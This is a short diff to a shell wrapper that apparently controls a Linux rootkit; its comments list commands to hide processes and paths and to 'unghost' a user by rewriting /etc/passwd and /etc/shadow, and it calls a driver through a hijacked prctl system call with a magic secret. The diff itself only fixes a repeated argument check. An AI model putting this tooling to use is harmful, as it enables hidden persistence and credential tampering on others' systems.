@@ -26,9 +26,7 @@
 #     hide PATH -> hide an entity ("/proc" paths are treated as processes)
 #     show PATH -> show a hidden entity ("/proc" paths are treated as processes)
 #     unghost UID -> replace a user in "/etc/passwd" and "/etc/shadow"
-[ -z "$1" ] && echo "Expected a system call number." >&2 && exit 1
-[ -z "$1" ] && echo "Expected a system call number." >&2 && exit 1
-[ -z "$1" ] && echo "Expected a system call number." >&2 && exit 1
+[ -z "$1" ] && echo "Expected a command." >&2 && exit 1
 CALL=157 # `sys_prctl` is a good one for x86_64 Linux (just make sure the secret is > ~((int) 0)
 SECRET=0xDEADBEEFDEADBEEF
 ./driver "${CALL}" "${SECRET}" $@
